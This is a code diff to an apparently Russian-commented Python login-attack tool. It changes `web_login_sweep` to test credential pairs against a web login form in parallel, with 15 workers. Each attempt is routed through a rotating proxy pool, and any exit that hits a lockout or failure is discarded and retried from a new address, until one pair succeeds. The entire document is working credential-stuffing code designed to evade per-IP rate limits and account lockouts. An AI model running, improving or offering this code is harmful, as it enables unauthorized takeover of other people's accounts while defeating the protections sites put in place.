@@ -100,39 +100,53 @@ async def web_login_try(url: str, user: str, password: str, user_field: str = 'u
 
 async def web_login_sweep(pairs: list, url: str, pool: dict,
                          user_field: str = 'username', pass_field: str = 'password',
-                         **kw) -> dict:
-    """Пройти пары по пулу ротации: каждая — со своего выхода, до успеха.
+                         workers: int = 15, **kw) -> dict:
+    """Пройти пары параллельно (workers разом), каждая — со своего выхода, до успеха.
 
     Args:
         pairs: [('логин', 'пароль'), …] — уже без проверенных ранее.
         url: адрес формы (`web_login_form` → action).
         pool: {'next','burn'} из `http_proxy_pool_rotate`; без пула — с текущего IP.
         user_field, pass_field, kw: см. `web_login_try` (fail_marker и пр.).
+        workers: сколько пар проверяется одновременно (каждая со своим адресом;
+            лимит сайта на IP от этого не меняется — per_ip всё так же бережёт его).
 
     Returns:
         {'verdict': 'успех'|'мимо'|'исчерпан', 'hit': пара или None,
          'tested': сколько пар реально проверено, 'skipped': сколько пар не
          проверено ни разу (сгорели выходы)}
     """
-    tested = skipped = 0
-    for user, pwd in pairs:
-        checked = False
-        while not checked:
-            proxy = pool['next']() if pool else ''
-            if pool and not proxy:
-                return {'verdict': 'исчерпан', 'hit': None,
-                        'tested': tested, 'skipped': skipped + 1}
-            res = await web_login_try(url, user, pwd, user_field, pass_field,
-                                      proxy=proxy, **kw)
-            if res['verdict'] in ('замок', 'сбой') and pool:
-                pool['burn'](proxy)
-                continue
-            if res['verdict'] in ('замок', 'сбой'):
-                skipped += 1
-                break
-            tested += 1
-            checked = True
-            if res['verdict'] == 'успех':
-                return {'verdict': 'успех', 'hit': (user, pwd),
-                        'tested': tested, 'skipped': skipped}
-    return {'verdict': 'мимо', 'hit': None, 'tested': tested, 'skipped': skipped}
+    q: asyncio.Queue = asyncio.Queue()
+    for pr in pairs:
+        q.put_nowait(pr)
+    out = {'tested': 0, 'skipped': 0, 'hit': None, 'verdict': 'мимо'}
+
+    async def worker():
+        while out['hit'] is None and out['verdict'] == 'мимо':
+            try:
+                user, pwd = q.get_nowait()
+            except asyncio.QueueEmpty:
+                return
+            checked = False
+            while not checked and out['verdict'] != 'исчерпан':
+                proxy = pool['next']() if pool else ''
+                if pool and not proxy:
+                    out['verdict'] = 'исчерпан'
+                    out['skipped'] += 1
+                    return
+                res = await web_login_try(url, user, pwd, user_field, pass_field,
+                                          proxy=proxy, **kw)
+                if res['verdict'] in ('замок', 'сбой'):
+                    if pool:
+                        pool['burn'](proxy)
+                        continue
+                    out['skipped'] += 1
+                    break
+                out['tested'] += 1
+                checked = True
+                if res['verdict'] == 'успех':
+                    out['hit'] = (user, pwd)
+
+    await asyncio.gather(*(worker() for _ in range(workers)))
+    return {'verdict': 'успех' if out['hit'] else out['verdict'], 'hit': out['hit'],
+            'tested': out['tested'], 'skipped': out['skipped']}
